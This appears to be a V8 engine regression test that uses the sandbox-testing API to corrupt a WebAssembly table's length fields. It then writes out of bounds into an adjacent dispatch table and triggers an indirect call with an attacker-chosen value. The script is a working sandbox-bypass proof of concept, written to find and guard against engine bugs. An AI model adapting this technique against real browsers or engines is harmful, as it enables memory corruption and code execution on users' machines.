// Copyright 2024 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $writer = builder.addFunction("writer", $sig_v_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);
let $boom = builder.addFunction("boom", $sig_v_ll)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kExprI32Const, 0,
    kExprCallIndirect, $sig_v_ll, 0,
  ])
let $dummy = builder.addFunction("dummy", $sig_v_ll).exportFunc().addBody([]);
// Target table.
let $t0 = builder
    .addTable(wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index])
    .exportAs('table_v_ll');
// Padding tables for alignment.
let $td0 = builder.addTable(
    wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index]);
let $td1 = builder.addTable(
    wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index]);
let $td2 = builder.addTable(
    wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index]);
// OOB table.
let $t1 = builder
    .addTable(wasmRefType($sig_v_ls), 1, 1, [kExprRefFunc, $writer.index])
    .exportAs("table_v_ls");

let instance = builder.instantiate();
let { writer, dummy, boom, table_v_ls, table_v_ll } = instance.exports;

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmTableType = Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kWasmTableObjectCurrentLengthOffset = Sandbox.getFieldOffset(kWasmTableType, 'current_length');
const kWasmTableObjectMaximumLengthOffset = Sandbox.getFieldOffset(kWasmTableType, 'maximum_length');
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

const kSmiMinusOne = 0xfffffffe;
setField(getPtr(table_v_ls), kWasmTableObjectCurrentLengthOffset, kSmiMinusOne);
setField(getPtr(table_v_ls), kWasmTableObjectMaximumLengthOffset, kSmiMinusOne);

// Check bypassed, write @ index -7 -> writes into table_v_ll dispatch table!
table_v_ls.set(0xfffffff9, writer);

boom(0x414141414141n, 42n);
